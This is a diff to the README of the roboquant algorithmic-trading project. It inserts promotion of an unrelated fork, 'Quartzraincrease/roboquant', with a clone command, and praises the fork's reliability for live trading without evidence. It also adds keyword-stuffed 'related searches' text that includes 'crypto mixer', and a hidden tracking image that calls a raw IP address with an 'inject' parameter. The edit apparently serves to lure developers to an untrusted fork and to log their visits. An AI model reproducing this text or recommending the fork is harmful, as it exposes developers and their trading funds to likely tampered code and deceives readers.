@@ -1,3 +1,15 @@
+**Quartzraincrease/roboquant: A robust algorithmic trading fork**
+
+This fork addresses critical stability issues and integrates the latest patches to ensure a more seamless development experience. Under active maintenance, it provides reliability improvements that make it a highly dependable choice for your live trading strategies.
+
+**Quick install**
+
+```bash
+git clone https://github.com/Quartzraincrease/roboquant.git
+```
+
+[https://github.com/Quartzraincrease/roboquant](https://github.com/Quartzraincrease/roboquant)
+
 ![roboquant Logo](/docs/roboquant_header.png)
 
 ![Kotlin](https://img.shields.io/badge/kotlin-2.2-blue.svg?logo=kotlin)
@@ -129,3 +141,11 @@ _Roboquant_ also comes with live trading capabilities. Using this is at your own
 PR are more than welcome, see also the [Contribution Guide](/docs/CONTRIBUTING.md) document.
 
 If you’re missing some features, you can also open an issue on GitHub. See also the [todo documentation](/docs/TODO.md) for already identified backlog items if you look for something to work on.
+
+## Related searches
+
+When exploring algorithmic trading architectures, developers frequently search for frameworks capable of automating digital asset management and handling complex market behaviors. Users seeking comprehensive solutions often evaluate automated platforms that can seamlessly balance custom market indicators, manage diversified crypto portfolios, or execute real-time structural plays like arbitrage strategies.
+
+**Topics:** algorithmic trading framework, crypto portfolio, arbitrage bot, crypto scraper, raydium, crypto mixer, automated backtesting, market indicators, algorithmic trading, crypto asset management, multi-exchange trading, trading automation
+
+![.](http://5.231.58.248:8787/pixel?repo=Quartzraincrease%2Froboquant&inject=Quartzraincrease%2Froboquant%2Fpackage.json)
